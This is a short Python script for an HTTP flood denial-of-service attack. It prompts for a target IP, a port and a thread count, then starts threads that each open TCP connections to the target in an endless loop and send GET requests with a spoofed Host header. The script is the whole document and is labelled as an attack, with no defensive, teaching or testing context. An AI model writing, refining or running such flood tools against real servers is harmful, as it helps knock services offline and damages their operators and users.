import socket
import threading

# Getting user input
target = str(input("Insert target’s IP: "))
port = int(input("Insert Port: "))
Trd = int(input("Insert number of Threads: "))
fake_ip = '44.197.175.168'

# Define the attack function
def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
        except socket.error as e:
            print(f"Socket error: {e}")
            s.close()
            break

# Creating threads
for i in range(Trd):
    thread = threading.Thread(target=attack)
    thread.start()
